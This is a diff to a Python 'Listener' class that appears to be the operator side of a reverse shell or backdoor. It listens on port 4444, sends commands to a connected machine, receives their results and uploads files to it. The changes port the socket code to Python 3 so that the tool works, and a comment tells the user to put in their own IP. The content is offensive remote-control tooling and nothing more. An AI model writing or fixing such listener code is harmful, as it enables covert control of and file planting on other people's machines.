@@ -24,13 +24,13 @@ class Listener:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -60,7 +60,7 @@ class Listener:
 
             if command[0] == "upload":
                 file_content = self.read_file(command[1])
-                command.append(file_content)
+                command.append(str(file_content))
 
             result = self.execute_remote_command(command)
 
@@ -70,6 +70,6 @@ class Listener:
             print(result)
 
 
-# Replace ip and port of your choice
+# Replace ip with your ip and port of your choice
 my_listener = Listener("192.168.1.24", 4444)
 my_listener.run()
